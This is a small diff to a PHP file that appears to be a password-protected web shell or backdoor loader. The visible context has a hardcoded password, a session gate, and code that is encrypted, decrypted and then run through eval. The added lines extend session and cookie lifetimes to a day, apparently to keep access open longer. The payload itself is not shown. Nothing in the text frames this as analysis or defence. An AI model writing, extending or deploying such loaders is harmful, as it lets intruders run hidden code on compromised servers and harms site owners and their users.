@@ -1,4 +1,6 @@
 <?php
+ini_set('session.gc_maxlifetime', 86400);
+session_set_cookie_params(86400);
 session_start();
 $pw = "plaga";
 
@@ -34,4 +36,5 @@ $enkripsiKode = openssl_encrypt($output, $method, $key, 0, $iv);
 $decryptedContent = openssl_decrypt($enkripsiKode, $method, $key, 0, $iv);
 eval('?>' . $decryptedContent);
 ?>
+
 
